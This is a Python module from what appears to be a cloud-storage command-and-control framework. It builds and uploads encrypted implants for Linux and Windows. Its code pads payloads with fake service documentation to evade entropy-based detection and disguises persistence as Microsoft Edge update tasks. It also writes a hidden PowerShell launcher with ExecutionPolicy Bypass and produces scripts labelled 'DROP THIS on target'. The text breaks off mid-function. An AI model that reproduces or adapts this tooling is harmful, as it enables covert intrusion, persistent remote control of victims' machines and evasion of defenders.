# providers/_wizard.py
# Entropy helpers, BaseConfig, ProviderWizard (Template Method).

import base64
import hashlib
import json
import math
import os
import random as _random
import re
import secrets
import socket
from abc import ABC, abstractmethod
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes as _hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat,
)
from collections import Counter

def _tz_now():
    import core.tz as _core_tz
    return _core_tz.now()

class _TzProxy:
    def now(self):
        return _tz_now()
    def strftime(self, fmt):
        return _tz_now().strftime(fmt)
    def isoformat(self, *a, **kw):
        return _tz_now().isoformat(*a, **kw)

_tz = _TzProxy()


from providers import _p, ask, ask_int, ask_yn, err, info, ok, sep, step, warn
from providers._notifications import _cancelable_run
from providers._session import (
    BaseTransport, MZ_MARKER, DOWNLOADS_DIR, _TEMPLATES_DIR,
    SessionProfile, Session, SessionManager,
    _load_persist_probe,
)
from providers._monitor import HeartbeatMonitor, AsyncPoller, send_async, _initial_hb_check
from providers._crypto import encrypt_command, decrypt_output, build_task, deploy_id_from_key


# ══════════════════════════════════════════════════════════════════════════════
#  ENTROPY HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _entropy(data: bytes) -> float:
    """Shannon entropy in bits per byte (range 0–8)."""
    if not data:
        return 0.0
    c = Counter(data)
    t = len(data)
    return -sum((n / t) * math.log2(n / t) for n in c.values())


# Low-entropy padding blocks appended to generated scripts.
# Content resembles embedded service documentation — entropy ~4.4 bits/byte.
# Values are randomised per-deploy so no two deployments share identical padding.

_PAD_SVCNAMES_WIN = [
    ("WindowsUpdateAgent",    "WUAgent"),
    ("MicrosoftEdgeUpdate",   "EdgeUpdate"),
    ("WindowsDefenderHelper", "WDHelper"),
    ("SvcHostHelper",         "SvcHost"),
    ("NetFrameworkHelper",    "NETHelper"),
]
_PAD_SVCNAMES_NIX = [
    ("systemd-networkd-helper", "networkd-helper"),
    ("update-notifier-daemon",  "update-notifier"),
    ("apt-periodic-helper",     "apt-periodic"),
    ("dbus-session-helper",     "dbus-helper"),
    ("pulse-audio-helper",      "pulsehelper"),
]


def _make_pad_block(mode: str) -> str:
    """Generate a per-call randomised low-entropy padding block."""
    r = _random.Random(os.urandom(4))
    maj   = r.randint(1, 4)
    min_  = r.randint(0, 9)
    patch = r.randint(0, 15)
    rev   = r.randint(0, 999)
    hb    = r.randint(30, 120)
    tmo   = r.randint(15, 60)
    retry = r.randint(2, 5)
    maxlog= r.choice([256, 512, 1024, 2048])
    net_t = r.randint(10, 30)
    free  = r.randint(5, 25)

    if mode == "ps1":
        svc, short = r.choice(_PAD_SVCNAMES_WIN)
        return (
            f"<#\n"
            f"{svc} - Background Service Module\n"
            f"Version {maj}.{min_}.{patch}.{rev} | System Services Group\n"
            f"\n"
            f"Provides scheduled maintenance for Windows platform services.\n"
            f"Core operations: cache management, index synchronization,\n"
            f"configuration reload, and service health verification.\n"
            f"\n"
            f"Registry (HKCU\\Software\\SystemServices\\{short}):\n"
            f"  EnableScheduler      : 1=on  0=off  (default 1)\n"
            f"  LogLevel             : 0 silent  1 errors  2 warnings  3 verbose\n"
            f"  MaintenanceWindow    : HH:MM-HH:MM  empty = always active\n"
            f"  RetryCount           : failure retries  (default {retry})\n"
            f"  TimeoutSeconds       : operation timeout  (default {tmo})\n"
            f"  CacheDirectory       : path override  (default %LOCALAPPDATA%)\n"
            f"  MaxLogSizeKB         : rotation threshold  (default {maxlog})\n"
            f"  HeartbeatIntervalSec : report cadence in seconds  (default {hb})\n"
            f"  StagingDirectory     : %TEMP%\\SystemServices\n"
            f"  NetworkTimeoutSec    : network timeout  (default {net_t})\n"
            f"  ProxyServer          : optional proxy address:port\n"
            f"  ProxyBypassList      : semicolon-separated bypass hosts\n"
            f"\n"
            f"Exit codes:\n"
            f"  0 success  1 failure  2 config  3 network  4 auth\n"
            f"  5 timeout  6 privileges  7 locked  8 disk-full  9 version\n"
            f"\n"
            f"Event log: Application  Source: SystemServices.{short}\n"
            f"  1000 started   1001 stopped   1002 config-ok  1003 cycle-ok\n"
            f"  1004 error     1005 net-fail  1006 retry      1007 timeout\n"
            f"  2000 task-add  2001 task-del  2002 triggered  2003 on-demand\n"
            f"\n"
            f"Compatibility: Windows 8.1 and Server 2012 R2 or later\n"
            f"Requires: PowerShell 5.1 or later  .NET 4.5 or later  {free} MB free\n"
            f"Logs: %LOCALAPPDATA%\\SystemServices\\Logs\\{short}.log\n"
            f"Config: run with -config flag to display current settings\n"
            f"Health: run with -status flag to verify service status\n"
            f"#>\n"
        )
    else:
        svc, short = r.choice(_PAD_SVCNAMES_NIX)
        return (
            f"# {svc} - Background Maintenance Component\n"
            f"# Version {maj}.{min_}.{patch} | System Services Group\n"
            f"#\n"
            f"# Provides scheduled maintenance for Linux and Unix-like systems.\n"
            f"# Operations: cache management, index sync, config reload,\n"
            f"#             service health checks, log rotation, cleanup.\n"
            f"#\n"
            f"# Configuration: /etc/systemservices/{short}.conf\n"
            f"#   enable_scheduler      = 1|0  (default 1)\n"
            f"#   log_level             = 0 silent  1 errors  2 warnings  3 verbose\n"
            f"#   maintenance_window    = HH:MM-HH:MM  empty = always active\n"
            f"#   retry_count           = failure retries  (default {retry})\n"
            f"#   timeout_seconds       = per-operation timeout  (default {tmo})\n"
            f"#   cache_directory       = path override (/var/cache/systemservices)\n"
            f"#   max_log_size_kb       = rotation threshold  (default {maxlog})\n"
            f"#   heartbeat_interval    = report cadence in seconds  (default {hb})\n"
            f"#   staging_directory     = /var/lib/systemservices/staging\n"
            f"#   network_timeout       = network operation timeout  (default {net_t})\n"
            f"#   proxy_server          = optional HTTP proxy address:port\n"
            f"#   proxy_bypass_list     = colon-separated bypass hosts\n"
            f"#\n"
            f"# Exit codes:\n"
            f"#   0 success  1 failure  2 config  3 network  4 auth\n"
            f"#   5 timeout  6 privileges  8 disk-full\n"
            f"#\n"
            f"# Systemd: systemservices-{short}.service\n"
            f"# Cron: */{retry} * * * * /usr/lib/systemservices/{short} -q\n"
            f"# Log:  /var/log/systemservices/{short}.log\n"
            f"# PID:  /run/systemservices/{short}.pid\n"
            f"# Cache: /var/cache/systemservices/\n"
            f"# Staging: /var/lib/systemservices/staging/\n"
            f"#\n"
            f"# Diagnostics: run with -v flag to enable verbose output\n"
            f"# Health: run with --status flag to verify service connectivity\n"
        )


def _pad_script_entropy(path: Path, target: float = 5.2,
                        mode: str = "ps1", max_pad: int = 102400) -> float:
    """Append low-entropy comment padding to a script until entropy <= target.

    Uses an iterative block-append loop for accuracy; the linear approximation
    is imprecise because entropy is not simply additive across byte distributions.
    Returns the final entropy; silently no-ops if already within target.
    """
    data = path.read_bytes()
    if _entropy(data) <= target:
        return _entropy(data)
    # Generate a per-call block so every deploy has different padding text.
    block = _make_pad_block(mode).encode()
    if target <= _entropy(block):
        return _entropy(data)
    buf = bytearray(data)
    total_pad = 0
    while True:
        buf += b"\n" + block
        total_pad += len(block) + 1
        H = _entropy(bytes(buf))
        if H <= target or total_pad >= max_pad:
            break
    path.write_bytes(bytes(buf))
    return H


# Fallback blob paths tried by the Windows stub when the configured path is not writable.
# Must stay in sync with $_blob_tries in stub.ps1 (items 2-4; item 1 is the configured path).
WIN_BLOB_FALLBACK_PATHS: list[str] = [
    "%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb",
    "%APPDATA%\\Microsoft\\Windows\\Recent\\.ddb",
    "%LOCALAPPDATA%\\Microsoft\\Windows\\History\\.ddb",
]

# ══════════════════════════════════════════════════════════════════════════════
#  BASE CONFIG
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class BaseConfig:
    """Common fields shared by every provider's deployment config."""
    folder_path:    str = "/Machine1"
    input_file:     str = "/input.txt"
    output_file:    str = "/output.txt"
    heartbeat_file: str = "/heartbeat.txt"

    blob_path_linux: str = "${HOME}/.config/pulse/.pid"
    blob_path_win:   str = "%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb"

    agent_name_win:   str = ""   # rename EXE/DLL/BIN to this stem (e.g. "RuntimeBroker"); "" = keep default
    agent_name_linux: str = ""   # rename ELF to this stem (e.g. "systemd-resolved"); "" = keep default

    mode: str = "staged-enc"

    base_sleep:          int = 30
    jitter_percent:      int = 30
    hb_refresh_interval: int = 15
    ip_ext:              str = ""
    window_start:        str = ""
    window_end:          str = ""
    kill_date:           str = ""   # "YYYY-MM-DD" or "" — agent self-destructs on/after this date
    stub_secret:         str = ""
    salt:                str = ""
    session_key:         str = ""   # hex-encoded 32-byte pre-shared key; GCM-wraps aes_key in server→agent direction
    debug_mode:          bool = False

    # Per-deploy cloud filenames — set from pub_key hash in run() to avoid
    # static Stratum fingerprints (.s2l/.s2w/.sk) discoverable via cloud search.
    sk_suffix:  str = ".sk"   # session key file (F3-1); staged-enc only
    s2l_suffix: str = ".s2l"
    s2w_suffix: str = ".s2w"

    s2_uploaded_at: str = ""

    # Per-deployment persist identity — randomised at key-gen time (CRIT-1/CRIT-2).
    persist_suffix:  str = ""   # e.g. ".local/share/a3f7b2c1"
    persist_payload: str = ""   # e.g. ".d4e1c9"
    persist_svc:     str = ""   # e.g. "a3f7b2c1"
    cron_comment:    str = ""   # e.g. "# a3f7b2c1-update"
    rc_comment:      str = ""   # e.g. "# a3f7b2c1-rc"
    task_name:       str = ""   # e.g. "MicrosoftEdgeUpdateTask3f7b2c1" (Windows CRIT-2)
    reg_value:       str = ""   # e.g. "MicrosoftEdgeHelper3f7b2c1"    (Windows CRIT-2)
    ua:              str = ""   # e.g. "Mozilla/5.0 ... Chrome/..."     (HIGH-4)
    staging_prefix:  str = ""   # e.g. "a3f7b2c1"                       (HIGH-12)

    @property
    def sk_path(self)       -> str: return self.folder_path + "/" + self.sk_suffix
    @property
    def s2_path_linux(self) -> str: return self.folder_path + "/" + self.s2l_suffix
    @property
    def s2_path_win(self)   -> str: return self.folder_path + "/" + self.s2w_suffix
    @property
    def poll_timeout(self)  -> int: return self.base_sleep * 3

    def save_creds(self) -> None:   raise NotImplementedError
    def load_creds(self) -> bool:   raise NotImplementedError


# ══════════════════════════════════════════════════════════════════════════════
#  PROVIDER WIZARD  (Template Method)
# ══════════════════════════════════════════════════════════════════════════════

def _ps1_concat(transport: str, core: str) -> str:
    """Concatenate transport + core PS1, keeping param() as the very first statement.

    PowerShell requires param() to be the first non-comment statement in a script.
    When transport is prepended to core, param() would end up in the middle and
    cause a CommandNotFoundException. This helper hoists it to line 1.
    """
    import re as _re
    m = _re.match(r'^(param\s*\(.*?\)\s*\n?)', core, _re.DOTALL)
    if m:
        param_block = m.group(1)
        core_body   = core[len(param_block):]
        return param_block + "\n" + transport + "\n\n" + core_body
    return transport + "\n\n" + core


def _resolve_stun_ip() -> str:
    """Resolve STUN server hostname to IPv4 at deploy-time.

    Baking the IP into the agent eliminates the DNS query on the target,
    removing a telemetry event visible to DNS proxies (e.g. Cisco SSE/Umbrella).
    Falls back to the hostname string so the agent degrades gracefully if
    resolution fails on the operator machine.

    NOTE (D7): if the target runs through a VPN or proxy, the STUN/DNS
    fallback will reflect the exit-node IP, not the target's true NIC address.
    The agent reports this as ip_ext; treat it as "IP seen from internet",
    which may differ from target_ip (LAN address) when VPN is active.
    """
    for host in ("stun.l.google.com", "stun1.l.google.com"):
        try:
            infos = socket.getaddrinfo(host, 19302, socket.AF_INET, socket.SOCK_DGRAM)
            if infos:
                return infos[0][4][0]
        except Exception:
            pass
    return "stun.l.google.com"


class ProviderWizard(ABC):
    """Abstract base for all provider deployment wizards.

    run(manager, project_dir) is the single public method.
    It calls abstract hooks in order; providers implement only what differs.
    """

    PROVIDER_ID:   str  = ""
    PROVIDER_NAME: str  = ""
    PROVIDER_ICON: str  = "📡"
    TRANSPORT_DIR: Path = Path(".")   # provider-specific transport functions only

    def __init__(self):
        self._step_n = 0
        self._cloud_cleanup_paths: list = []   # paths uploaded to cloud during this wizard run
        self._cloud_transport: "Optional[BaseTransport]" = None  # transport for rollback deletes

    def _step(self, title: str) -> None:
        self._step_n += 1
        step(str(self._step_n), title)

    # ── abstract hooks ─────────────────────────────────────────────────────────
    # Required: make_config, step_auth, step_init_channel, _make_transport
    # Optional override: _provider_subs, step_upload_stage2, step_upload_stageless_enc

    @abstractmethod
    def make_config(self) -> BaseConfig: ...

    @abstractmethod
    def step_auth(self, cfg: BaseConfig) -> None: ...

    @abstractmethod
    def step_init_channel(self, cfg: BaseConfig) -> None: ...

    @abstractmethod
    def _make_transport(self, cfg: BaseConfig) -> BaseTransport:
        """Instantiate the provider's transport from wizard config."""
        ...

    # ── provider credential substitution ──────────────────────────────────────
    # Override _provider_subs to inject credentials into generated scripts.
    # Keys vary by script type; agent.sh and stub.sh share the same namespace
    # when writing to a single `_provider_subs` is sufficient.

    def _provider_subs(self, cfg: BaseConfig) -> dict:
        """Return credential placeholders to replace in generated scripts.

        Override in provider subclasses.  The default (no-op) is correct for
        providers whose credentials are embedded at the transport layer rather
        than as script-level placeholders.
        """
        return {}

    def _agent_sh_subs(self, cfg: BaseConfig) -> dict:
        return self._provider_subs(cfg)

    def _agent_ps1_subs(self, cfg: BaseConfig) -> dict:
        return self._provider_subs(cfg)

    def _stub_subs(self, cfg: BaseConfig) -> dict:
        return self._provider_subs(cfg)

    def _tracked_upload(self, t: "BaseTransport", path: str, data: bytes) -> None:
        """Upload data and register the cloud path for rollback on wizard error.

        Call this for sensitive artifacts (BK, stage2 blobs) so that a later
        wizard failure causes them to be deleted automatically.  Channel files
        (input/output/heartbeat) created by step_init_channel are not tracked
        because they contain no secret material and overwrite safely.
        """
        self._cloud_transport = t
        t.upload(path, data)
        if path not in self._cloud_cleanup_paths:
            self._cloud_cleanup_paths.append(path)

    # ── concrete upload steps ─────────────────────────────────────────────────
    # Provider-agnostic; delegates upload I/O to self._make_transport(cfg).
    # Override only if your provider needs non-standard upload logic.

    def step_upload_stage2(self, cfg: BaseConfig, agent_dir: Path, pub_pem: bytes) -> None:
        self._step(f"Stage2 Encryption & {self.PROVIDER_NAME} Upload")
        info("Building stage2 payloads...")

        # Linux stage2 — bash script (text); built and uploaded immediately.
        s2_sh     = self._build_agent_sh(cfg, pub_pem)
        s2_sh_enc = self._encrypt_payload(s2_sh, cfg.stub_secret)
        ok("Linux stage2 encrypted with stub_secret")
        (agent_dir / "stage2_linux.enc").write_text(s2_sh_enc)

        # Windows stage2 — raw stub.dll compiled by _step_compile_artifacts.
        # Cannot be uploaded here because the DLL does not exist yet.
        # step_upload_stage2_win() is called after _step_compile_artifacts().

        t = self._make_transport(cfg)
        self._tracked_upload(t, cfg.s2_path_linux, s2_sh_enc.encode())
        cfg.s2_uploaded_at = _tz.now().isoformat()
        ok(f"Stage2 Linux   → {self.PROVIDER_NAME}:{cfg.s2_path_linux}  (cancelled at first heartbeat)")

    def step_upload_stage2_win(self, cfg: BaseConfig, agent_dir: Path) -> None:
        """Upload Windows stage2 (stub.bin shellcode) — called after Rust compilation."""
        bin_path = agent_dir / "stub.bin"
        if not bin_path.exists():
            warn("Windows stage2 skipped — stub.bin not found after compilation")
            return
        self._step(f"Windows Stage2 Upload")
        bin_bytes  = bin_path.read_bytes()
        s2_win_enc = self._encrypt_payload_bytes(bin_bytes, cfg.stub_secret)
        ok("Windows stage2 (shellcode) encrypted")
        (agent_dir / "stage2_win.enc").write_text(s2_win_enc)
        t = self._make_transport(cfg)
        self._tracked_upload(t, cfg.s2_path_win, s2_win_enc.encode())
        ok(f"Stage2 Windows → {self.PROVIDER_NAME}:{cfg.s2_path_win}")

    def step_upload_stageless_enc(self, cfg: BaseConfig, agent_dir: Path, pub_pem: bytes) -> None:
        self._step("Stageless-Enc: Encrypt & Embed Payload")
        for tpl_t, tpl_c in (("stub.sh", "stub_stageless.sh"), ("stub.ps1", "stub_stageless.ps1")):
            if not (self.TRANSPORT_DIR / tpl_t).exists():
                err(f"Missing transport: {self.TRANSPORT_DIR / tpl_t}")
            if not (_TEMPLATES_DIR / tpl_c).exists():
                err(f"Missing core: {_TEMPLATES_DIR / tpl_c}")

        info("Building agent payloads...")
        s2_sh  = self._build_agent_sh(cfg, pub_pem)
        s2_ps1 = self._build_agent_ps1(cfg, pub_pem)
        info("Encrypting with stub_secret...")
        s2_sh_enc  = self._encrypt_payload(s2_sh, cfg.stub_secret)
        ok("Linux payload encrypted with stub_secret")
        s2_ps1_enc = ""
        if s2_ps1:
            s2_ps1_enc = self._encrypt_payload(s2_ps1, cfg.stub_secret)
            ok("Windows payload encrypted with stub_secret")

        deploy_id = hashlib.sha256(pub_pem).hexdigest()[:16]
        base_subs = {
            "STUB_SECRET":       cfg.stub_secret,
            "STUB_SALT":         cfg.salt,
            "STUB_WINDOW_START": cfg.window_start,
            "STUB_WINDOW_END":   cfg.window_end,
            "STUB_DEPLOY_ID":    deploy_id,
        }
        base_subs.update(self._stub_subs(cfg))

        t_sh  = self.TRANSPORT_DIR / "stub.sh"
        c_sh  = _TEMPLATES_DIR / "stub_stageless.sh"
        content = "#!/usr/bin/env bash\n" + t_sh.read_text() + "\n\n" + c_sh.read_text()
        subs = dict(base_subs)
        subs["STUB_BLOB_PATH"]  = cfg.blob_path_linux
        subs["STUB_S2_PAYLOAD"] = s2_sh_enc
        subs["STUB_DBG_INIT"]   = self._dbg_init_stub_sh(cfg)
        for old, new in subs.items():
            content = content.replace(old, new)
        dst = agent_dir / "agent_stageless.sh"
        dst.write_text(content)
        dst.chmod(0o755)
        ok("agent_stageless.sh → agent/ (Linux — DROP THIS on target)")

        t_ps1 = self.TRANSPORT_DIR / "stub.ps1"
        c_ps1 = _TEMPLATES_DIR / "stub_stageless.ps1"
        if s2_ps1_enc and t_ps1.exists() and c_ps1.exists():
            content = _ps1_concat(t_ps1.read_text(), c_ps1.read_text())
            subs = dict(base_subs)
            subs["STUB_BLOB_PATH"]  = cfg.blob_path_win
            subs["STUB_S2_PAYLOAD"] = s2_ps1_enc
            subs["STUB_DBG_INIT"]   = self._dbg_init_stub_ps1(cfg)
            for old, new in subs.items():
                content = content.replace(old, new)
            dst = agent_dir / "agent_stageless.ps1"
            dst.write_text(content, encoding="utf-8")
            ok("agent_stageless.ps1 → agent/ (Windows — DROP THIS on target)")
            self._write_vbs_launcher(dst, "agent_stageless.vbs")
            ok("agent_stageless.vbs → agent/ (Windows launcher — no console flash)")

    # ── extension points ───────────────────────────────────────────────────────

    def _step_configure_extra(self, cfg: BaseConfig) -> None:
        """Override for provider-specific configuration prompts."""
        pass

    def _native_agent_extra_env(self, cfg: BaseConfig) -> dict:
        """Return provider-specific env vars injected into the native agent at compile time.

        Override in provider subclasses.  Keys must match the STRATUM_* names
        expected by agents/native/rust/build.rs:
          STRATUM_APP_KEY, STRATUM_APP_SECRET, STRATUM_REFRESH_TOKEN
        """
        return {}

    @property
    def _creds_filename(self) -> str:
        return f".{self.PROVIDER_ID}_refresh_token"

    @property
    def _global_creds_file(self) -> Path:
        """Shared credentials cache used for wizard re-use prompts (credentials/<provider>).
        After deploy, a per-session copy lives inside the deploy dir."""
        return Path("credentials") / self.PROVIDER_ID

    def _creds_path(self, deploy_dir: Path) -> Path:
        """Return the path to the credentials file used in the session profile.
        Override in provider subclasses that store creds outside the deployment dir."""
        return deploy_dir / self._creds_filename

    # ── concrete provider-agnostic steps ──────────────────────────────────────

    def _step_check_templates(self) -> None:
        self._step("Template Check")
        for src in (_TEMPLATES_DIR / "core.sh", self.TRANSPORT_DIR / "agent.sh"):
            if not src.exists():
                err(f"Missing template: {src}")
        ok("Templates found")

    def _step_keygen(self, keys_dir: Path, session_id: str, cfg: BaseConfig,
                    key_password: Optional[bytes] = None):
        self._step("RSA Key Generation")
        info("Generating RSA 4096-bit key pair…")
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        if key_password:
            from cryptography.hazmat.primitives.serialization import BestAvailableEncryption
            encryption = BestAvailableEncryption(key_password)
            ok_suffix = " (encrypted at rest)"
        else:
            encryption = NoEncryption()
            ok_suffix = ""
        priv_pem = private_key.private_bytes(
            Encoding.PEM, PrivateFormat.TraditionalOpenSSL, encryption)
        pub_pem = private_key.public_key().public_bytes(
            Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
        keys_dir.mkdir(parents=True, exist_ok=True)
        (keys_dir / "private_key.pem").write_bytes(priv_pem)
        (keys_dir / "public_key.pem").write_bytes(pub_pem)
        (keys_dir / "private_key.pem").chmod(0o600)
        (keys_dir / "public_key.pem").chmod(0o644)
        self._step_generate_session_key(cfg)
        self._generate_persist_identity(cfg)
        session_key_file = keys_dir / "session_key.hex"
        session_key_file.write_text(cfg.session_key)
        session_key_file.chmod(0o600)
        ok(f"RSA 4096-bit key pair + session_key → keys/{session_id}/{ok_suffix}")
        return priv_pem, pub_pem

    def _step_create_deploy_dir(self, cfg: BaseConfig, session_id: str) -> Path:
        base_dir = Path("deployments")
        base_dir.mkdir(exist_ok=True)
        label = cfg.folder_path.strip("/").replace("/", "_") or "default"
        slug  = f"{self.PROVIDER_ID}_{label}_{session_id}"
        deploy_dir = base_dir / slug
        deploy_dir.mkdir(parents=True)
        (deploy_dir / "agent").mkdir()
        ok(f"Deployment directory: {deploy_dir}")
        return deploy_dir

    # LOW-15: update periodically to stay within current browser version distribution
    # Last updated: 2026-06 (Chrome 136, Firefox 138, Edge 136)
    _UA_POOL = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    ]

    def _generate_persist_identity(self, cfg: BaseConfig) -> None:
        """Generate per-deployment random persist strings (CRIT-1 Linux, CRIT-2 Windows, HIGH-4 UA)."""
        tag = secrets.token_hex(4)   # 8 hex chars, e.g. "a3f7b2c1"
        cfg.persist_suffix  = f".local/share/{tag}"
        cfg.persist_payload = f".{secrets.token_hex(3)}"
        cfg.persist_svc     = tag
        cfg.cron_comment    = f"# {tag}-update"
        cfg.rc_comment      = f"# {tag}-rc"
        win_tag = secrets.token_hex(4)
        cfg.task_name  = f"MicrosoftEdgeUpdateTask{win_tag}"
        cfg.reg_value  = f"MicrosoftEdgeHelper{win_tag}"
        cfg.ua             = self._UA_POOL[secrets.randbelow(len(self._UA_POOL))]
        cfg.staging_prefix = secrets.token_hex(4)

    def _step_generate_session_key(self, cfg: BaseConfig) -> None:
        cfg.session_key = secrets.token_bytes(32).hex()

    def _step_generate_stub_secret(self, cfg: BaseConfig) -> None:
        self._step("Stub Secret")
        cfg.stub_secret = secrets.token_hex(32)
        cfg.salt        = secrets.token_hex(16)
        ok("Stub secret generated (baked in stub at compile time — never touches cloud)")

    def _encrypt_payload(self, plaintext: str, password: str) -> str:
        # AES-256-GCM + PBKDF2-SHA256 (HIGH-2: authenticated encryption).
        # Wire format: "SGCM:" + base64(salt[8] + nonce[12] + ciphertext + tag[16])
        # All agents (Rust, sh, ps1) expect this exact format.
        salt  = os.urandom(8)
        nonce = os.urandom(12)
        dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32, salt=salt, iterations=210_000
                           ).derive(password.encode())
        ct_tag = AESGCM(dk).encrypt(nonce, ("STRATUM:" + plaintext).encode(), None)
        return "SGCM:" + base64.b64encode(salt + nonce + ct_tag).decode()

    def _encrypt_payload_bytes(self, data: bytes, password: str) -> str:
        # Same wire format as _encrypt_payload but for raw binary payloads
        # (e.g. Windows stage2 DLL).  No "STRATUM:" text prefix — the Rust
        # loader validates the decrypted payload by checking the MZ magic bytes.
        salt  = os.urandom(8)
        nonce = os.urandom(12)
        dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32, salt=salt, iterations=210_000
                           ).derive(password.encode())
        ct_tag = AESGCM(dk).encrypt(nonce, data, None)
        return "SGCM:" + base64.b64encode(salt + nonce + ct_tag).decode()

    # ── compile-time debug initialisation strings ──────────────────────────────

    def _dbg_init_stub_sh(self, cfg: BaseConfig) -> str:
        if cfg.debug_mode:
            return "_vf='-v'; _log() { echo \"[stub] $*\"; }; _log 'debug mode active'"
        return "_vf=''; _log() { :; }"

    def _dbg_init_core_sh(self, cfg: BaseConfig) -> str:
        if cfg.debug_mode:
            return "VERBOSE_MODE=1; log() { echo \"$@\"; }"
        return "VERBOSE_MODE=0; log() { :; }"

    def _dbg_init_stub_ps1(self, cfg: BaseConfig) -> str:
        if cfg.debug_mode:
            return "$_sv = $true\nfunction _dbg($m) { Write-Host \"[dbg] $m\" }"
        return "$_sv = $false\nfunction _dbg($m) {}"

    def _dbg_init_core_ps1(self, cfg: BaseConfig) -> str:
        if cfg.debug_mode:
            return "$v = $true\nfunction Write-Log { param([string]$Message); Write-Host $Message }"
        return "$v = $false\nfunction Write-Log { param([string]$Message) }"

    @staticmethod
    def _write_vbs_launcher(ps1_path: "Path", vbs_name: str) -> "Path":
        """Write a windowless VBScript launcher next to the PS1 artifact.

        Uses WScript.Shell.Run with window-style 0 (maps to CREATE_NO_WINDOW
        at the Win32 level) so no conhost.exe window flashes when the agent
        is executed from Explorer, a Run key, or any launcher that doesn't
        explicitly set CREATE_NO_WINDOW itself.
        """
        vbs_path = ps1_path.parent / vbs_name
        # Double-quote escaping: VBScript uses "" inside a string literal.
        ps1_abs = str(ps1_path.name)   # relative — caller drops this on the same dir
        vbs_content = (
            'CreateObject("WScript.Shell").Run '
            '"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
            f'-ExecutionPolicy Bypass -File ""{ps1_abs}""", 0, False\r\n'
        )
        vbs_path.write_text(vbs_content, encoding="ascii")
        return vbs_path

    def _build_agent_sh(self, cfg: BaseConfig, pub_pem: bytes) -> str:
        transport_src = self.TRANSPORT_DIR / "agent.sh"
        core_src = _TEMPLATES_DIR / "core.sh"
        if not transport_src.exists():
            err(f"{self.TRANSPORT_DIR}/agent.sh not found")
        if not core_src.exists():
            err("agents/templates/core.sh not found")
        content = "#!/usr/bin/env bash\n" + transport_src.read_text() + "\n\n" + core_src.read_text()
        pk_b64  = base64.b64encode(pub_pem).decode()
        chunk   = len(pk_b64) // 4
        # For staged-enc, session_key is baked in stage2 (not fetched from cloud).
        # All modes embed the real session key directly in the agent script.
        _sk_val = cfg.session_key
        subs = {
            "PLACEHOLDER_PK1": pk_b64[:chunk],
            "PLACEHOLDER_PK2": pk_b64[chunk:chunk * 2],
            "PLACEHOLDER_PK3": pk_b64[chunk * 2:chunk * 3],
            "PLACEHOLDER_PK4": pk_b64[chunk * 3:],
            "PLACEHOLDER_SESSION_KEY":    _sk_val,
            "PLACEHOLDER_FOLDER_PATH":    cfg.folder_path,
            "PLACEHOLDER_INPUT_FILE":     cfg.input_file,
            "PLACEHOLDER_OUTPUT_FILE":    cfg.output_file,
            "PLACEHOLDER_HEARTBEAT_FILE": cfg.heartbeat_file,
            "PLACEHOLDER_BASE_SLEEP":     str(cfg.base_sleep),
            "PLACEHOLDER_JITTER_PERCENT": str(cfg.jitter_percent),
            "PLACEHOLDER_KILL_DATE":      cfg.kill_date,
            "PLACEHOLDER_BLOB_PATH":      cfg.blob_path_linux,
            "PLACEHOLDER_STUN_IP":        _resolve_stun_ip(),
            "STUB_DBG_INIT":              self._dbg_init_core_sh(cfg),
            # Per-deployment persist identity (CRIT-1)
            "PLACEHOLDER_PERSIST_SUFFIX":  cfg.persist_suffix,
            "PLACEHOLDER_PERSIST_PAYLOAD": cfg.persist_payload,
            "PLACEHOLDER_CRON_COMMENT":    cfg.cron_comment,
            "PLACEHOLDER_PERSIST_SVC":     cfg.persist_svc,
            "PLACEHOLDER_RC_COMMENT":      cfg.rc_comment,
        }
        subs.update(self._agent_sh_subs(cfg))
        for old, new in subs.items():
            content = content.replace(old, new)
        return content

    def _build_agent_ps1(self, cfg: BaseConfig, pub_pem: bytes) -> str:
        transport_src = self.TRANSPORT_DIR / "agent.ps1"
        core_src = _TEMPLATES_DIR / "core.ps1"
        if not transport_src.exists() or not core_src.exists():
            return ""
        content = _ps1_concat(transport_src.read_text(), core_src.read_text())
        pk_b64  = base64.b64encode(pub_pem).decode()
        chunk   = len(pk_b64) // 4
        _sk_val = cfg.session_key
        subs = {
            "PLACEHOLDER_PK1": pk_b64[:chunk],
            "PLACEHOLDER_PK2": pk_b64[chunk:chunk * 2],
            "PLACEHOLDER_PK3": pk_b64[chunk * 2:chunk * 3],
            "PLACEHOLDER_PK4": pk_b64[chunk * 3:],
            "PLACEHOLDER_SESSION_KEY":    _sk_val,
            "PLACEHOLDER_FOLDER_PATH":    cfg.folder_path,
            "PLACEHOLDER_INPUT_FILE":     cfg.input_file,
            "PLACEHOLDER_OUTPUT_FILE":    cfg.output_file,
            "PLACEHOLDER_HEARTBEAT_FILE": cfg.heartbeat_file,
            "PLACEHOLDER_BASE_SLEEP":     str(cfg.base_sleep),
            "PLACEHOLDER_JITTER_PERCENT": str(cfg.jitter_percent),
            "PLACEHOLDER_KILL_DATE":      cfg.kill_date,
            "PLACEHOLDER_STUN_IP":        _resolve_stun_ip(),
            "STUB_DBG_INIT":              self._dbg_init_core_ps1(cfg),
